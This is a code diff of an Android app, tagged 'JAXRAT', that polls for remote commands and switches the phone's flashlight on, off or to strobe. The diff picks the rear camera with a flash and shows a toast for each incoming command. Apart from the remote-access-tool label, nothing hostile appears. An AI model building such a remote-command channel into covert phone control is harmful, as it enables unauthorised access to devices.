@@ -3,11 +3,13 @@ package com.ezax.agent;
 import android.app.Activity;
 import android.content.Context;
 import android.hardware.camera2.CameraAccessException;
+import android.hardware.camera2.CameraCharacteristics;
 import android.hardware.camera2.CameraManager;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
 import android.util.Log;
+import android.widget.Toast;
 import org.json.JSONObject;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
@@ -28,11 +30,24 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
+        
+        // --- CARI KAMERA YANG PUNYA FLASH (LEBIH PINTAR) ---
         try {
-            cameraId = cameraManager.getCameraIdList()[0]; 
+            for (String id : cameraManager.getCameraIdList()) {
+                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(id);
+                Boolean flashAvailable = characteristics.get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
+                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
+                
+                // Kita cari kamera belakang yang ada flash-nya
+                if (flashAvailable != null && flashAvailable && facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) {
+                    cameraId = id;
+                    break;
+                }
+            }
         } catch (CameraAccessException e) {
             Log.e("JAXRAT", "Kamera error", e);
         }
+
         startPolling();
     }
 
@@ -72,7 +87,9 @@ public class MainActivity extends Activity {
     }
 
     private void executeCommand(String cmd) {
-        Log.d("JAXRAT", "Perintah: " + cmd);
+        // Tampilkan Pop-up di HP biar kita tau perintah masuk
+        runOnUiThread(() -> Toast.makeText(MainActivity.this, "Cmd: " + cmd, Toast.LENGTH_SHORT).show());
+
         if (cmd.equals("flash_on")) {
             stopStrobe(); setTorch(true);
         } else if (cmd.equals("flash_off")) {
@@ -86,8 +103,14 @@ public class MainActivity extends Activity {
 
     private void setTorch(boolean state) {
         try {
-            cameraManager.setTorchMode(cameraId, state);
-        } catch (CameraAccessException e) {}
+            if (cameraId != null) {
+                cameraManager.setTorchMode(cameraId, state);
+            } else {
+                runOnUiThread(() -> Toast.makeText(MainActivity.this, "Kamera flash tidak ditemukan!", Toast.LENGTH_SHORT).show());
+            }
+        } catch (CameraAccessException e) {
+            Log.e("JAXRAT", "Gagal nyalain senter", e);
+        }
     }
 
     private void startStrobe() {
